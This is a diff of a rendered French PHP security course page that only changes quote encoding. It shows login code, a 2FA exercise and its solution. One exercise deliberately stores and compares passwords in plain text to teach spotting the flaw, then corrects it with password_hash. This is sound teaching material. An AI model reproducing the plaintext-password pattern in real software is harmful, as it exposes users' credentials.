-    <span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-    <span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+    <span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+    <span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
-    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="p">);</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username = ?"</span><span class="p">);</span>
     <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$username</span><span class="p">]);</span>
     <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;tentatives&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Réinitialiser en cas de succès</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'tentatives'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// Réinitialiser en cas de succès</span>
         <span class="c1">// Connexion réussie…</span>
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
 
-<span class="x">&lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span>
-<span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
-<span class="x">    &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;</span>
-<span class="x">    &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;</span>
-<span class="x">    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span>
+<span class="x">&lt;form action="/login" method="post"&gt;</span>
+<span class="x">    &lt;input type="hidden" name="token" value="</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">"&gt;</span>
+<span class="x">    &lt;input type="text" name="username" placeholder="Username"&gt;</span>
+<span class="x">    &lt;input type="password" name="password" placeholder="Password"&gt;</span>
+<span class="x">    &lt;input type="submit" value="Login"&gt;</span>
 <span class="x">&lt;/form&gt;</span>
 </code></pre></div>
 <p><strong>Points clés :</strong></p>
@@ -7813,26 +7813,26 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Est-ce que vous voyez la potentielle faille de sécurité ?</p>
 <p>Le code de création d'un utilisateur est le suivant :</p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Création d&#39;un utilisateur</span>
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="c1">// Création d'un utilisateur</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
-<span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span><span class="p">;</span>
+<span class="nv">$request</span> <span class="o">=</span> <span class="s2">"INSERT INTO users (username, password) VALUES (?, ?)"</span><span class="p">;</span>
 <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">]);</span>
 
 <span class="cp">?&gt;</span>
 </code></pre></div>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="c1">// Vérification du mot de passe</span>
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
-<span class="nv">$request</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="p">;</span>
+<span class="nv">$request</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE username = ?"</span><span class="p">;</span>
 <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$request</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$username</span><span class="p">]);</span>
 
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">===</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">===</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="p">{</span>
     <span class="c1">// Connexion réussie</span>
     <span class="c1">// …</span>
 <span class="p">}</span>
@@ -7842,10 +7842,10 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <div class="admonition tip">
 <p class="admonition-title">details Documentation</p>
 <p>Pour stocker un mot de passe, vous devez utiliser la fonction <code>password_hash()</code>.</p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$password = password_hash($_POST[&#39;password&#39;], PASSWORD_DEFAULT);</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$password = password_hash($_POST['password'], PASSWORD_DEFAULT);</span>
 </code></pre></div>
 <p>Pour vérifier un mot de passe, vous devez utiliser la fonction <code>password_verify()</code>.</p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">if (password_verify($_POST[&#39;password&#39;], $user[&#39;password&#39;])) {</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">if (password_verify($_POST['password'], $user['password'])) {</span>
 <span class="x">    // Le mot de passe est valide</span>
 <span class="x">}</span>
 </code></pre></div>
@@ -7856,28 +7856,28 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <p>Les mots de passe sont stockés <strong>en clair</strong> dans la base de données. Si un attaquant accède à la base (via une injection SQL, une sauvegarde exposée, un accès non autorisé…), il obtient immédiatement tous les mots de passe. Des comptes comme <code>root</code>/<code>root</code> et <code>user</code>/<code>user</code> sont de plus trivialement faibles.</p>
 <p><strong>Correction : hachage des mots de passe</strong></p>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
-<span class="c1">// Création d&#39;un utilisateur — hacher le mot de passe avant stockage</span>
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span> <span class="c1">// Ne pas sanitize avant hash (peut altérer le mot de passe)</span>
+<span class="c1">// Création d'un utilisateur — hacher le mot de passe avant stockage</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span> <span class="c1">// Ne pas sanitize avant hash (peut altérer le mot de passe)</span>
 
 <span class="c1">// PASSWORD_DEFAULT utilise bcrypt — algorithme adaptatif recommandé</span>
 <span class="nv">$hash</span> <span class="o">=</span> <span class="nb">password_hash</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nx">PASSWORD_DEFAULT</span><span class="p">);</span>
 
-<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span><span class="p">);</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO users (username, password) VALUES (?, ?)"</span><span class="p">);</span>
 <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$hash</span><span class="p">]);</span>
 <span class="cp">?&gt;</span>
 </code></pre></div>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="c1">// Vérification du mot de passe</span>
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
 
-<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username = ?&quot;</span><span class="p">);</span>
+<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE username = ?"</span><span class="p">);</span>
 <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="nv">$username</span><span class="p">]);</span>
 <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>
 
 <span class="c1">// password_verify compare le mot de passe saisi avec le hash stocké</span>
-<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">&amp;&amp;</span> <span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="c1">// Connexion réussie</span>
 <span class="p">}</span>
 <span class="cp">?&gt;</span>
@@ -7896,39 +7896,39 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <h2 id="double-authentification">Double authentification<a class="headerlink" href="#double-authentification" title="Permanent link">⚓︎</a></h2>
 <p>L'auditeur a trouvé une faille de sécurité dans votre application. Il vous demande de mettre en place une double authentification pour renforcer la sécurité de votre application.</p>
 <p>Il vous encourage à mettre en place une authentification à deux facteurs (2FA) de type matériel (une application mobile), pour cela il vous indique que vous pouvez utiliser le code de la librairie 2FAAuth. Celle-ci s'utilise de la manière suivante :</p>
-<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$doubleAuth = new 2FAAuth(&quot;Nom de l&#39;application&quot;);</span>
+<div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="x">$doubleAuth = new 2FAAuth("Nom de l'application");</span>
 <span class="x">$user = User::findByLogin($login, $password);</span>
 <span class="x">$doubleAuth-&gt;setUser($user);</span>
-<span class="x">$code = $_POST[&#39;code&#39;] ?? null;</span>
+<span class="x">$code = $_POST['code'] ?? null;</span>
 
 <span class="x">if($doubleAuth-&gt;isCodeValid($code)) {</span>
-<span class="x">    // L&#39;utilisateur est authentifié</span>
+<span class="x">    // L'utilisateur est authentifié</span>
 <span class="x">} else {</span>
-<span class="x">    // L&#39;utilisateur doit saisir le code 2FA</span>
+<span class="x">    // L'utilisateur doit saisir le code 2FA</span>
 <span class="x">}</span>
 </code></pre></div>
 <p>Le code actuel de votre application est le suivant :</p>
 <h3 id="page-de-login">Page de login<a class="headerlink" href="#page-de-login" title="Permanent link">⚓︎</a></h3>
-<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/login&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Username&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Password&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"/login"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"username"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"Username"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"password"</span> <span class="na">name</span><span class="o">=</span><span class="s">"password"</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">"Password"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Login"</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </code></pre></div>
 <h3 id="page-de-gestion-de-lauthentification">Page de gestion de l'authentification<a class="headerlink" href="#page-de-gestion-de-lauthentification" title="Permanent link">⚓︎</a></h3>
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 
-<span class="c1">// Page de gestion de l&#39;authentification</span>
+<span class="c1">// Page de gestion de l'authentification</span>
 
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
 <span class="nv">$user</span> <span class="o">=</span> <span class="nx">User</span><span class="o">::</span><span class="na">findByLogin</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /dashboard&#39;</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /dashboard'</span><span class="p">);</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /login&#39;</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login'</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="k">die</span><span class="p">();</span>
@@ -7949,18 +7949,18 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="nb">session_start</span><span class="p">();</span>
 
-<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
-<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
 <span class="nv">$user</span> <span class="o">=</span> <span class="nx">User</span><span class="o">::</span><span class="na">findByLogin</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Étape 1 réussie : stocker l&#39;utilisateur en session (pas encore connecté)</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;pending_user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">;</span>
+    <span class="c1">// Étape 1 réussie : stocker l'utilisateur en session (pas encore connecté)</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'pending_user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">;</span>
     <span class="c1">// Rediriger vers la page de saisie du code 2FA</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /login-2fa&#39;</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login-2fa'</span><span class="p">);</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /login?error=1&#39;</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login?error=1'</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">die</span><span class="p">();</span>
 </code></pre></div>
@@ -7968,34 +7968,34 @@ Le navigateur de l'admin charge l'image → la suppression est déclenchée à s
 <div class="language-php highlight"><span class="filename">🐘 PHP</span><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="nb">session_start</span><span class="p">();</span>
 
-<span class="c1">// Vérifier que l&#39;étape 1 a bien été franchie</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;pending_user_id&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /login&#39;</span><span class="p">);</span>
+<span class="c1">// Vérifier que l'étape 1 a bien été franchie</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'pending_user_id'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login'</span><span class="p">);</span>
     <span class="k">die</span><span class="p">();</span>
 <span class="p">}</span>
 
-<span class="nv">$user</span> <span class="o">=</span> <span class="nx">User</span><span class="o">::</span><span class="na">findById</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;pending_user_id&#39;</span><span class="p">]);</span>
+<span class="nv">$user</span> <span class="o">=</span> <span class="nx">User</span><span class="o">::</span><span class="na">findById</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'pending_user_id'</span><span class="p">]);</span>
 
-<span class="nv">$doubleAuth</span> <span class="o">=</span> <span class="k">new</span> <span class="mi">2</span><span class="nx">FAAuth</span><span class="p">(</span><span class="s2">&quot;MonApplication&quot;</span><span class="p">);</span>
+<span class="nv">$doubleAuth</span> <span class="o">=</span> <span class="k">new</span> <span class="mi">2</span><span class="nx">FAAuth</span><span class="p">(</span><span class="s2">"MonApplication"</span><span class="p">);</span>
 <span class="nv">$doubleAuth</span><span class="o">-&gt;</span><span class="na">setUser</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
 
-<span class="nv">$code</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
+<span class="nv">$code</span> <span class="o">=</span> <span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">'code'</span><span class="p">,</span> <span class="nx">FILTER_SANITIZE_STRING</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nv">$doubleAuth</span><span class="o">-&gt;</span><span class="na">isCodeValid</span><span class="p">(</span><span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
     <span class="c1">// Authentification complète : créer la session définitive</span>
-    <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;pending_user_id&#39;</span><span class="p">]);</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">;</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /dashboard&#39;</span><span class="p">);</span>
+    <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'pending_user_id'</span><span class="p">]);</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">;</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /dashboard'</span><span class="p">);</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /login-2fa?error=1&#39;</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /login-2fa?error=1'</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">die</span><span class="p">();</span>
 </code></pre></div>
 <p>Formulaire de saisie du code 2FA :</p>
-<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/login-2fa&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
+<div class="language-html highlight"><span class="filename">HTML</span><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"/login-2fa"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
     <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Saisissez le code généré par votre application mobile :<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;code&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Code à 6 chiffres&quot;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;6&quot;</span><span class="p">&gt;</span>
